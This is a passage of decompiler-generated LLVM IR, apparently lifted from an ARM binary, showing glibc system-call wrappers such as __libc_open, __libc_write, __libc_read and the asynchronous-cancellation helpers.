  %v0_14a90 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_14a90, i32* @ip, align 4
  store i32 %v3_14a8c, i32* @r7, align 4
  %v1_14aac = call i32 @__libc_disable_asynccancel(i32 %v0_14a90)
  %v0_14ab0 = load i32, i32* @r7, align 4
  store i32 %v0_14ab0, i32* @r0, align 4
  %v2_14ab4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14ab4, i32* @r7, align 4
  store i32 %v12_14a8c, i32* @lr, align 4
  %v2_14ab8 = icmp ugt i32 %v0_14ab0, -4097
  %v7_14ab8 = icmp eq i32 %v0_14ab0, -4096
  store i1 %v7_14ab8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ab8, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_14a8c
  %v0_14ac0 = call i32 @__syscall_error()
  %v0_14ad0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14ad0, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_14ad0 = load i32, i32* @r1, align 4
  %v5_14ad0 = udiv i32 %v0_14ac0, 262144
  %v6_14ad0 = and i32 %v1_14ad0, %v5_14ad0
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14ab0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14a80, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14a8c, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_14ae4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14ae4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14ae4 = load i32, i32* @r0, align 4
  ret i32 %v2_14ae4

bb1:                                              ; preds = %entry
  %v0_14ae8 = call i32 @__syscall_error()
  ret i32 %v0_14ae8
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14af4 = load i32, i32* @global_var_2541c.545, align 4
  %v2_14af8 = icmp eq i32 %v3_14af4, 0
  store i1 %v2_14af8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14af8, label %dec_label_pc_14b00, label %entry.dec_label_pc_14b1c_crit_edge

entry.dec_label_pc_14b1c_crit_edge:               ; preds = %entry
  %v3_14b1c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14b1c

dec_label_pc_14b00:                               ; preds = %entry
  %v0_14b10 = load i32, i32* @r0, align 4
  %v2_14b10 = icmp ugt i32 %v0_14b10, -4097
  %v7_14b10 = icmp eq i32 %v0_14b10, -4096
  store i1 %v7_14b10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b10, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_14b1c, %bb10, %bb11, %dec_label_pc_14b00
  %merge2 = phi i32 [ %v0_14b10, %dec_label_pc_14b00 ], [ %v0_14b40, %dec_label_pc_14b1c ], [ %v0_14b50, %bb10 ], [ %v0_14b50, %bb11 ]
  ret i32 %merge2

bb9:                                              ; preds = %dec_label_pc_14b00
  %v0_14b18 = call i32 @__syscall_error()
  br label %dec_label_pc_14b1c

dec_label_pc_14b1c:                               ; preds = %entry.dec_label_pc_14b1c_crit_edge, %bb9
  %v3_14b1c = phi i32 [ %v3_14b1c.pre, %entry.dec_label_pc_14b1c_crit_edge ], [ %v0_14b18, %bb9 ]
  store i32 %v3_14b1c, i32* %stack_var_-24, align 4
  %v9_14b1c = load i32, i32* @r2, align 4
  %v12_14b1c = load i32, i32* @r3, align 4
  %v15_14b1c = load i32, i32* @r7, align 4
  store i32 %v15_14b1c, i32* %stack_var_-8, align 4
  %v18_14b1c = load i32, i32* @lr, align 4
  %v0_14b20 = call i32 @__libc_enable_asynccancel()
  %v2_14b28 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_14b1c, i32* @r2, align 4
  store i32 %v12_14b1c, i32* @r3, align 4
  store i32 %v2_14b28, i32* @r7, align 4
  %v1_14b3c = call i32 @__libc_disable_asynccancel(i32 %v0_14b20)
  %v0_14b40 = load i32, i32* @r7, align 4
  store i32 %v0_14b40, i32* @r0, align 4
  %v2_14b44 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b44, i32* @r7, align 4
  store i32 %v18_14b1c, i32* @lr, align 4
  %v2_14b48 = icmp ugt i32 %v0_14b40, -4097
  %v7_14b48 = icmp eq i32 %v0_14b40, -4096
  store i1 %v7_14b48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b48, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_14b1c
  %v0_14b50 = call i32 @__syscall_error()
  %v0_14b60 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14b60, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v2_14b60 = load i32, i32* @r8, align 4
  %v3_14b60 = mul i32 %v2_14b60, %v0_14b50
  store i32 %v3_14b60, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14b50, { 0, 2, 1 }
  uselistorder i32 %v0_14b40, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14b10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b1c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_14b74 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14b74, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14b74 = load i32, i32* @r0, align 4
  ret i32 %v2_14b74

bb1:                                              ; preds = %entry
  %v0_14b78 = call i32 @__syscall_error()
  ret i32 %v0_14b78
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b84 = load i32, i32* @global_var_2541c.545, align 4
  %v2_14b88 = icmp eq i32 %v3_14b84, 0
  store i1 %v2_14b88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b88, label %dec_label_pc_14b90, label %entry.dec_label_pc_14bac_crit_edge

entry.dec_label_pc_14bac_crit_edge:               ; preds = %entry
  %v3_14bac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14bac

dec_label_pc_14b90:                               ; preds = %entry
  %v0_14ba0 = load i32, i32* @r0, align 4
  %v2_14ba0 = icmp ugt i32 %v0_14ba0, -4097
  %v7_14ba0 = icmp eq i32 %v0_14ba0, -4096
  store i1 %v7_14ba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ba0, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_14bac, %dec_label_pc_14b90
  %merge = phi i32 [ %v0_14ba0, %dec_label_pc_14b90 ], [ %v0_14bd0, %dec_label_pc_14bac ], [ %v0_14be0, %bb10 ], [ %v6_14bf0, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_14b90
  %v0_14ba8 = call i32 @__syscall_error()
  br label %dec_label_pc_14bac

dec_label_pc_14bac:                               ; preds = %entry.dec_label_pc_14bac_crit_edge, %bb9
  %v3_14bac = phi i32 [ %v3_14bac.pre, %entry.dec_label_pc_14bac_crit_edge ], [ %v0_14ba8, %bb9 ]
  %v12_14bac = load i32, i32* @r3, align 4
  %v15_14bac = load i32, i32* @r7, align 4
  store i32 %v15_14bac, i32* %stack_var_-8, align 4
  %v18_14bac = load i32, i32* @lr, align 4
  %v0_14bb0 = call i32 @__libc_enable_asynccancel()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_14bac, i32* @r3, align 4
  store i32 %v3_14bac, i32* @r7, align 4
  %v1_14bcc = call i32 @__libc_disable_asynccancel(i32 %v0_14bb0)
  %v0_14bd0 = load i32, i32* @r7, align 4
  store i32 %v0_14bd0, i32* @r0, align 4
  %v2_14bd4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14bd4, i32* @r7, align 4
  store i32 %v18_14bac, i32* @lr, align 4
  %v2_14bd8 = icmp ugt i32 %v0_14bd0, -4097
  %v7_14bd8 = icmp eq i32 %v0_14bd0, -4096
  store i1 %v7_14bd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14bd8, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_14bac
  %v0_14be0 = call i32 @__syscall_error()
  %v0_14bf0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14bf0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_14bf0 = load i32, i32* @r1, align 4
  %v5_14bf0 = mul i32 %v0_14be0, 65536
  %v6_14bf0 = and i32 %v1_14bf0, %v5_14bf0
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14bd0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14ba0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bac, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_14c04 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14c04, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14c04 = load i32, i32* @r0, align 4
  ret i32 %v2_14c04

bb1:                                              ; preds = %entry
  %v0_14c08 = call i32 @__syscall_error()
  ret i32 %v0_14c08

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14c14 = load i32, i32* @global_var_2541c.545, align 4
  %v2_14c18 = icmp eq i32 %v3_14c14, 0
  br i1 %v2_14c18, label %dec_label_pc_14c20, label %entry.dec_label_pc_14c3c_crit_edge

entry.dec_label_pc_14c3c_crit_edge:               ; preds = %entry
  %v3_14c3c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14c3c

dec_label_pc_14c20:                               ; preds = %entry
  %v0_14c30 = load i32, i32* @r0, align 4
  %v2_14c30 = icmp ugt i32 %v0_14c30, -4097
  br i1 %v2_14c30, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_14c3c, %dec_label_pc_14c20
  %merge = phi i32 [ %v0_14c30, %dec_label_pc_14c20 ], [ %v0_14c60, %dec_label_pc_14c3c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_14c20
  %v0_14c38 = call i32 @__syscall_error()
  br label %dec_label_pc_14c3c

dec_label_pc_14c3c:                               ; preds = %entry.dec_label_pc_14c3c_crit_edge, %bb8
  %v3_14c3c = phi i32 [ %v3_14c3c.pre, %entry.dec_label_pc_14c3c_crit_edge ], [ %v0_14c38, %bb8 ]
  %v6_14c3c = load i32, i32* @r1, align 4
  %v15_14c3c = load i32, i32* @r7, align 4
  store i32 %v15_14c3c, i32* %stack_var_-8, align 4
  %v18_14c3c = load i32, i32* @lr, align 4
  %v0_14c40 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_14c3c, i32* @r1, align 4
  store i32 %v3_14c3c, i32* @r7, align 4
  %v1_14c5c = call i32 @__libc_disable_asynccancel(i32 %v0_14c40)
  %v0_14c60 = load i32, i32* @r7, align 4
  store i32 %v0_14c60, i32* @r0, align 4
  %v2_14c64 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14c64, i32* @r7, align 4
  store i32 %v18_14c3c, i32* @lr, align 4
  %v2_14c68 = icmp ugt i32 %v0_14c60, -4097
  br i1 %v2_14c68, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_14c3c
  %v0_14c70 = call i32 @__syscall_error()
  ret i32 %v0_14c70

; uselistorder directives
  uselistorder i32 %v0_14c60, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_14c3c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_14c80 = load i32, i32* %r0.global-to-local, align 4
  %v1_14c80 = and i32 %v0_14c80, 2
  %v2_14c80 = icmp eq i32 %v1_14c80, 0
  %v3_14c84 = load i32, i32* @r4, align 4
  store i32 %v3_14c84, i32* %stack_var_-16, align 4
  br i1 %v2_14c80, label %dec_label_pc_14c8c, label %dec_label_pc_14d00

dec_label_pc_14c8c:                               ; preds = %entry
  %v0_14c8c = call i32 @__aeabi_read_tp()
  store i32 %v0_14c8c, i32* %r0.global-to-local, align 4
  %v1_14c90 = add i32 %v0_14c8c, -1036
  %v2_14c90 = inttoptr i32 %v1_14c90 to i32*
  %v3_14c90 = load i32, i32* %v2_14c90, align 4
  %v1_14c94 = add i32 %v0_14c8c, -1168
  store i32 %v1_14c94, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14c98

dec_label_pc_14c98:                               ; preds = %dec_label_pc_14ccc.dec_label_pc_14c98_crit_edge, %dec_label_pc_14c8c
  %v0_14ca4 = phi i32 [ %v0_14ca4.pre, %dec_label_pc_14ccc.dec_label_pc_14c98_crit_edge ], [ %v1_14c94, %dec_label_pc_14c8c ]
  %v0_14c98 = phi i32 [ %v0_14ccc, %dec_label_pc_14ccc.dec_label_pc_14c98_crit_edge ], [ %v3_14c90, %dec_label_pc_14c8c ]
  %v1_14c98 = and i32 %v0_14c98, -3
  store i32 %v1_14c98, i32* %r7.global-to-local, align 4
  store i32 %v0_14c98, i32* %r4.global-to-local, align 4
  store i32 %v1_14c98, i32* @r1, align 4
  %v1_14ca4 = add i32 %v0_14ca4, 132
  store i32 %v1_14ca4, i32* @r2, align 4
  %v1_14ca823 = inttoptr i32 %v1_14ca4 to i32*
  %v2_14ca824 = load i32, i32* %v1_14ca823, align 4
  %v3_14cac26 = icmp uge i32 %v2_14ca824, %v0_14c98
  store i1 %v3_14cac26, i1* %cpsr_c.global-to-local, align 1
  %v9_14cac32 = icmp eq i32 %v2_14ca824, %v0_14c98
  br i1 %v9_14cac32, label %dec_label_pc_14cb4, label %dec_label_pc_14ccc

dec_label_pc_14cb4:                               ; preds = %dec_label_pc_14c98, %dec_label_pc_14cb4.dec_label_pc_14ca8_crit_edge
  %v0_14cb433 = phi i32 [ %v1_14cac.pre, %dec_label_pc_14cb4.dec_label_pc_14ca8_crit_edge ], [ %v0_14c98, %dec_label_pc_14c98 ]
  store i32 %v0_14cb433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14cc4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14cc4, label %dec_label_pc_14cc8, label %dec_label_pc_14cb4.dec_label_pc_14ca8_crit_edge

dec_label_pc_14cb4.dec_label_pc_14ca8_crit_edge:  ; preds = %dec_label_pc_14cb4
  %v0_14ca8.pre = load i32, i32* @r2, align 4
  %v1_14cac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14ca8 = inttoptr i32 %v0_14ca8.pre to i32*
  %v2_14ca8 = load i32, i32* %v1_14ca8, align 4
  %v3_14cac = icmp uge i32 %v2_14ca8, %v1_14cac.pre
  store i1 %v3_14cac, i1* %cpsr_c.global-to-local, align 1
  %v9_14cac = icmp eq i32 %v2_14ca8, %v1_14cac.pre
  br i1 %v9_14cac, label %dec_label_pc_14cb4, label %dec_label_pc_14ccc

dec_label_pc_14cc8:                               ; preds = %dec_label_pc_14cb4
  %v0_14cc8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14ccc

dec_label_pc_14ccc:                               ; preds = %dec_label_pc_14c98, %dec_label_pc_14cb4.dec_label_pc_14ca8_crit_edge, %dec_label_pc_14cc8
  %v0_14ccc = phi i32 [ %v0_14cc8, %dec_label_pc_14cc8 ], [ %v2_14ca824, %dec_label_pc_14c98 ], [ %v2_14ca8, %dec_label_pc_14cb4.dec_label_pc_14ca8_crit_edge ]
  %v1_14ccc = phi i32 [ %v0_14cc8, %dec_label_pc_14cc8 ], [ %v0_14c98, %dec_label_pc_14c98 ], [ %v1_14cac.pre, %dec_label_pc_14cb4.dec_label_pc_14ca8_crit_edge ]
  %v3_14ccc = icmp uge i32 %v0_14ccc, %v1_14ccc
  store i1 %v3_14ccc, i1* %cpsr_c.global-to-local, align 1
  %v9_14ccc = icmp eq i32 %v0_14ccc, %v1_14ccc
  br i1 %v9_14ccc, label %dec_label_pc_14cf4.preheader, label %dec_label_pc_14ccc.dec_label_pc_14c98_crit_edge

dec_label_pc_14ccc.dec_label_pc_14c98_crit_edge:  ; preds = %dec_label_pc_14ccc
  %v0_14ca4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14c98

dec_label_pc_14cf4.preheader:                     ; preds = %dec_label_pc_14ccc
  %v0_14cf41 = load i32, i32* %r7.global-to-local, align 4
  %v1_14cf42 = and i32 %v0_14cf41, 12
  store i32 %v1_14cf42, i32* @r3, align 4
  %v2_14cf83 = icmp ugt i32 %v1_14cf42, 3
  store i1 %v2_14cf83, i1* %cpsr_c.global-to-local, align 1
  %v7_14cf85 = icmp eq i32 %v1_14cf42, 4
  br i1 %v7_14cf85, label %dec_label_pc_14cd8.lr.ph, label %dec_label_pc_14cf4.preheader.dec_label_pc_14d00.loopexit_crit_edge

dec_label_pc_14cf4.preheader.dec_label_pc_14d00.loopexit_crit_edge: ; preds = %dec_label_pc_14cf4.preheader
  %v1_14d04.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14d00.loopexit

dec_label_pc_14cd8.lr.ph:                         ; preds = %dec_label_pc_14cf4.preheader
  %v0_14cdc.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_14cdc = add i32 %v0_14cdc.pre, 132
  %v2_14cf0 = inttoptr i32 %v1_14cdc to i32*
  br label %dec_label_pc_14cd8

dec_label_pc_14cd8:                               ; preds = %dec_label_pc_14cd8.lr.ph, %dec_label_pc_14cd8
  %v0_14cd8 = phi i32 [ %v0_14cf41, %dec_label_pc_14cd8.lr.ph ], [ %v3_14cf0, %dec_label_pc_14cd8 ]
  store i32 %v0_14cd8, i32* @r2, align 4
  store i32 %v1_14cdc, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_14cf0 = load i32, i32* %v2_14cf0, align 4
  store i32 %v3_14cf0, i32* %r7.global-to-local, align 4
  %v1_14cf4 = and i32 %v3_14cf0, 12
  store i32 %v1_14cf4, i32* @r3, align 4
  %v7_14cf8 = icmp eq i32 %v1_14cf4, 4
  br i1 %v7_14cf8, label %dec_label_pc_14cd8, label %dec_label_pc_14cf4.dec_label_pc_14d00.loopexit_crit_edge

dec_label_pc_14cf4.dec_label_pc_14d00.loopexit_crit_edge: ; preds = %dec_label_pc_14cd8
  %v2_14cf8 = icmp ugt i32 %v1_14cf4, 3
  store i1 %v2_14cf8, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_14d00.loopexit

dec_label_pc_14d00.loopexit:                      ; preds = %dec_label_pc_14cf4.preheader.dec_label_pc_14d00.loopexit_crit_edge, %dec_label_pc_14cf4.dec_label_pc_14d00.loopexit_crit_edge
  %v1_14d04.pre = phi i32 [ %v1_14d04.pre.pre, %dec_label_pc_14cf4.preheader.dec_label_pc_14d00.loopexit_crit_edge ], [ %v1_14cdc, %dec_label_pc_14cf4.dec_label_pc_14d00.loopexit_crit_edge ]
  %v2_14d00.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_14d00

dec_label_pc_14d00:                               ; preds = %dec_label_pc_14d00.loopexit, %entry
  %v1_14d04 = phi i32 [ %v1_14d04.pre, %dec_label_pc_14d00.loopexit ], [ %v0_14c80, %entry ]
  %v2_14d00 = phi i32 [ %v2_14d00.pre, %dec_label_pc_14d00.loopexit ], [ %v3_14c84, %entry ]
  store i32 %v2_14d00, i32* @r4, align 4
  ret i32 %v1_14d04

; uselistorder directives
  uselistorder i32 %v3_14cf0, { 1, 2, 0 }
  uselistorder i32 %v1_14cdc, { 0, 2, 1 }
  uselistorder i32 %v0_14cc8, { 1, 0 }
  uselistorder i32 %v1_14cac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14c98, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 0, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_14d00.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_14cd8, { 1, 0 }
  uselistorder label %dec_label_pc_14ccc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14cb4, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14d08 = load i32, i32* @r4, align 4
  store i32 %v3_14d08, i32* %stack_var_-24, align 4
  store i32 54496, i32* %r8.global-to-local, align 4
  %v0_14d10 = call i32 @__aeabi_read_tp()
  %v1_14d14 = add i32 %v0_14d10, -1036
  %v2_14d14 = inttoptr i32 %v1_14d14 to i32*
  %v3_14d14 = load i32, i32* %v2_14d14, align 4
  store i32 %v3_14d14, i32* %r6.global-to-local, align 4
  %v1_14d18 = add i32 %v0_14d10, -1168
  store i32 %v1_14d18, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r8.global-to-local, align 4
  %v1_14d2046 = or i32 %v3_14d14, 2
  store i32 %v1_14d2046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14d2449 = icmp eq i32 %v1_14d2046, %v3_14d14
  br i1 %v9_14d2449, label %dec_label_pc_14dd0, label %dec_label_pc_14d2c

dec_label_pc_14d2c:                               ; preds = %entry, %bb.dec_label_pc_14d2c_crit_edge
  %v0_14d30 = phi i32 [ %v0_14d30.pre, %bb.dec_label_pc_14d2c_crit_edge ], [ %v1_14d18, %entry ]
  %v1_14d2051 = phi i32 [ %v1_14d20, %bb.dec_label_pc_14d2c_crit_edge ], [ %v1_14d2046, %entry ]
  %v0_14d3450 = phi i32 [ %v1_14d60, %bb.dec_label_pc_14d2c_crit_edge ], [ %v3_14d14, %entry ]
  store i32 %v1_14d2051, i32* @r1, align 4
  %v1_14d30 = add i32 %v0_14d30, 132
  store i32 %v1_14d30, i32* @r2, align 4
  store i32 %v0_14d3450, i32* %r4.global-to-local, align 4
  %v1_14d3834 = inttoptr i32 %v1_14d30 to i32*
  %v2_14d3835 = load i32, i32* %v1_14d3834, align 4
  store i32 %v2_14d3835, i32* @r3, align 4
  %v3_14d3c37 = icmp uge i32 %v2_14d3835, %v0_14d3450
  store i1 %v3_14d3c37, i1* %cpsr_c.global-to-local, align 1
  %v9_14d3c43 = icmp eq i32 %v2_14d3835, %v0_14d3450
  br i1 %v9_14d3c43, label %dec_label_pc_14d44, label %dec_label_pc_14d5c

dec_label_pc_14d44:                               ; preds = %dec_label_pc_14d2c, %dec_label_pc_14d44.dec_label_pc_14d38_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14d54 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14d54, label %dec_label_pc_14d58, label %dec_label_pc_14d44.dec_label_pc_14d38_crit_edge

dec_label_pc_14d44.dec_label_pc_14d38_crit_edge:  ; preds = %dec_label_pc_14d44
  %v0_14d38.pre = load i32, i32* @r2, align 4
  %v1_14d3c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14d38 = inttoptr i32 %v0_14d38.pre to i32*
  %v2_14d38 = load i32, i32* %v1_14d38, align 4
  store i32 %v2_14d38, i32* @r3, align 4
  %v3_14d3c = icmp uge i32 %v2_14d38, %v1_14d3c.pre
  store i1 %v3_14d3c, i1* %cpsr_c.global-to-local, align 1
  %v9_14d3c = icmp eq i32 %v2_14d38, %v1_14d3c.pre
  br i1 %v9_14d3c, label %dec_label_pc_14d44, label %dec_label_pc_14d5c

dec_label_pc_14d58:                               ; preds = %dec_label_pc_14d44
  %v0_14d58 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14d58, i32* @r3, align 4
  br label %dec_label_pc_14d5c

dec_label_pc_14d5c:                               ; preds = %dec_label_pc_14d2c, %dec_label_pc_14d44.dec_label_pc_14d38_crit_edge, %dec_label_pc_14d58
  %v1_14d60 = phi i32 [ %v0_14d58, %dec_label_pc_14d58 ], [ %v2_14d3835, %dec_label_pc_14d2c ], [ %v2_14d38, %dec_label_pc_14d44.dec_label_pc_14d38_crit_edge ]
  %v1_14d5c = load i32, i32* %r6.global-to-local, align 4
  %v3_14d5c = icmp uge i32 %v1_14d60, %v1_14d5c
  store i1 %v3_14d5c, i1* %cpsr_c.global-to-local, align 1
  %v9_14d5c = icmp eq i32 %v1_14d60, %v1_14d5c
  br i1 %v9_14d5c, label %dec_label_pc_14d68, label %bb

bb:                                               ; preds = %dec_label_pc_14d5c
  store i32 %v1_14d60, i32* %r6.global-to-local, align 4
  %v1_14d20 = or i32 %v1_14d60, 2
  store i32 %v1_14d20, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14d24 = icmp eq i32 %v1_14d20, %v1_14d60
  br i1 %v9_14d24, label %dec_label_pc_14dd0, label %bb.dec_label_pc_14d2c_crit_edge

bb.dec_label_pc_14d2c_crit_edge:                  ; preds = %bb
  %v0_14d30.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14d2c

dec_label_pc_14d68:                               ; preds = %dec_label_pc_14d5c
  %v0_14d68 = load i32, i32* %r5.global-to-local, align 4
  %v1_14d68 = and i32 %v0_14d68, -69
  store i32 %v1_14d68, i32* @r3, align 4
  %v2_14d6c = icmp ugt i32 %v1_14d68, 9
  store i1 %v2_14d6c, i1* %cpsr_c.global-to-local, align 1
  %v7_14d6c = icmp eq i32 %v1_14d68, 10
  br i1 %v7_14d6c, label %dec_label_pc_14d74, label %dec_label_pc_14dd0

dec_label_pc_14d74:                               ; preds = %dec_label_pc_14d68
  %v1_14d78 = load i32, i32* %r7.global-to-local, align 4
  %v2_14d78 = add i32 %v1_14d78, 544
  %v3_14d78 = inttoptr i32 %v2_14d78 to i32*
  store i32 -1, i32* %v3_14d78, align 4
  %v0_14d7c = load i32, i32* @r2, align 4
  store i32 %v0_14d7c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14d80

dec_label_pc_14d80:                               ; preds = %dec_label_pc_14db4.dec_label_pc_14d80_crit_edge, %dec_label_pc_14d74
  %v0_14d84 = phi i32 [ %v0_14d84.pre, %dec_label_pc_14db4.dec_label_pc_14d80_crit_edge ], [ %v0_14d7c, %dec_label_pc_14d74 ]
  %v0_14d80 = load i32, i32* %r7.global-to-local, align 4
  %v1_14d80 = add i32 %v0_14d80, 132
  %v2_14d80 = inttoptr i32 %v1_14d80 to i32*
  %v3_14d80 = load i32, i32* %v2_14d80, align 4
  store i32 %v0_14d84, i32* @r2, align 4
  store i32 %v3_14d80, i32* %r4.global-to-local, align 4
  %v1_14d8c = or i32 %v3_14d80, 16
  store i32 %v1_14d8c, i32* @r1, align 4
  %v1_14d9022 = inttoptr i32 %v0_14d84 to i32*
  %v2_14d9023 = load i32, i32* %v1_14d9022, align 4
  %v3_14d9425 = icmp uge i32 %v2_14d9023, %v3_14d80
  store i1 %v3_14d9425, i1* %cpsr_c.global-to-local, align 1
  %v9_14d9431 = icmp eq i32 %v2_14d9023, %v3_14d80
  br i1 %v9_14d9431, label %dec_label_pc_14d9c, label %dec_label_pc_14db4

dec_label_pc_14d9c:                               ; preds = %dec_label_pc_14d80, %dec_label_pc_14d9c.dec_label_pc_14d90_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14dac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14dac, label %dec_label_pc_14db0, label %dec_label_pc_14d9c.dec_label_pc_14d90_crit_edge

dec_label_pc_14d9c.dec_label_pc_14d90_crit_edge:  ; preds = %dec_label_pc_14d9c
  %v0_14d90.pre = load i32, i32* @r2, align 4
  %v1_14d94.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14d90 = inttoptr i32 %v0_14d90.pre to i32*
  %v2_14d90 = load i32, i32* %v1_14d90, align 4
  %v3_14d94 = icmp uge i32 %v2_14d90, %v1_14d94.pre
  store i1 %v3_14d94, i1* %cpsr_c.global-to-local, align 1
  %v9_14d94 = icmp eq i32 %v2_14d90, %v1_14d94.pre
  br i1 %v9_14d94, label %dec_label_pc_14d9c, label %dec_label_pc_14db4

dec_label_pc_14db0:                               ; preds = %dec_label_pc_14d9c
  %v0_14db0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14db4

dec_label_pc_14db4:                               ; preds = %dec_label_pc_14d80, %dec_label_pc_14d9c.dec_label_pc_14d90_crit_edge, %dec_label_pc_14db0
